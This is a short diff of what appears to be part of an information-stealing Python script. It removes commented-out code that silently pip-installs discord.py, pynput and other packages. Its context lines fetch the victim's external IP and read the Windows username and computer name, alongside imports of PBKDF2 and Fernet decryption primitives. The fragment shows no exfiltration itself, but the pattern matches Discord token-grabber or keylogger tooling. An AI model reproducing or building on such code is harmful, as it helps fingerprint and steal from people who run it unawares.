@@ -32,16 +32,6 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.fernet import Fernet
 
 
-#requirements = ["","lxml","discord.py","requests","pillow","admin","pynput"]
-#with open(f'requirements.txt', 'a') as saveFile:
-#    #saveFile.write('\n'.join(requirements))
-#    
-#def check():
-#    subprocess.check_call([sys.executable, '-m','pip', 'install','-r',"requirements.txt"])
-#check()
-#os.remove("requirements.txt")
-
-
 external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
 pc_username = os.getenv('UserName')
 pc_name = os.getenv('COMPUTERNAME')
